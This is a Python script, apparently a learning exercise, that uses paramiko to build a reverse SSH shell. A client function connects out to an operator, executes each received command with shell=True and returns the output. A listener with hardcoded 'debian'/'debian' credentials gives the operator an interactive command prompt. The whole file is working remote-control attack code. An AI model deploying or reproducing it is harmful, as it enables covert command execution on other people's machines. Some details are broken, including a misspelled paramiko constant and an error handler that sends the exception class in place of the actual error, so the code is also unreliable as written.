#!/bin/python3

import paramiko
import socket
import threading
import subprocess
import sys

def ssh_cliend_cmd(ip, user, passwd, cmd, _port=22):
	ssh_client = paramiko.SSHClient()
	ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh_client.connect(hostname=ip, username=user, password=passwd, port=_port)
		ssh_session = ssh_client.get_transport().open_session()
		if ssh_session.active:
			ssh_session.send(cmd)
			# print(ssh_session.recv(1024).decode())
			print(ssh_session.recv(1024))
		# stdin, stdout, stderr = ssh_client.exec_command(cmd)
		# print(stdout.read().decode())
		while True:
			# cmd = ssh_session.recv(1024).decode()
			cmd = ssh_session.recv(1024)
			try:
				cmd_output = subprocess.check_output(cmd.decode(), shell=True)
				ssh_session.send(cmd_output)
			except Exception:
				ssh_session.send(str(Exception))
	finally:
		ssh_client.close()

class Server(paramiko.ServerInterface):
	def __init__(self):
		self.event = threading.Event()
	def check_channel_request(self, kind, chanid):
		if kind == "session":
			return (paramiko.OPEN_SUCCEEDED) #to verify
		return (paramiko.OPEN_FAILED_ADMINITRATIVELY_PROHIBITED) # to verify
	def check_auth_password(self, username, password):
		if (username == "debian") and (password == "debian"):
			return (paramiko.AUTH_SUCCESSFUL) #to verify
		return (paramiko.AUTH_FAILED)

if __name__ == "__main__":
	#using the key from the Paramiko demo files
	host_key = paramiko.RSAKey(filename="test_rsa.key")
	server = sys.argv[1]
	ssh_port = int(sys.argv[2])
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind((server, ssh_port))
		sock.listen(10)
		print("[+] Listening for connection...")
		client, addr = sock.accept()
	except Exception as e:
		print("[-] Listen failed: "+ str(e))
		sys.exit(1)
	print("[+] Got a connection")
	try:
		bhSession = paramiko.Transport(client) #to verify
		bhSession.add_server_key(host_key)
		server = Server()
		try:
			bhSession.start_server(server=server)
		except paramiko.SSHException:
			print("[-] SSH negociation failed.")
		chan = bhSession.accept(20)
		print("[+] Authenticated!")
		print(chan.recv(1024).decode())
		chan.send("Welcome to ft_ssh")
		while True:
			try:
				cmd = input("Enter command: ").strip('\n') # to verify
				if cmd != "exit":
					chan.send(cmd)
					print(chan.recv(1024).decode(errors="ignore") + "\n")
				else:
					chan.send("exit")
					print("exiting")
					bhSession.close()
					raise Exception("exit")
			except KeyboardInterrupt:
				bhSession.close()
			except Exception as e:
				print("[-] caught exception: " + str(e))
				bhSession.close()
	finally:
		sys.exit(1)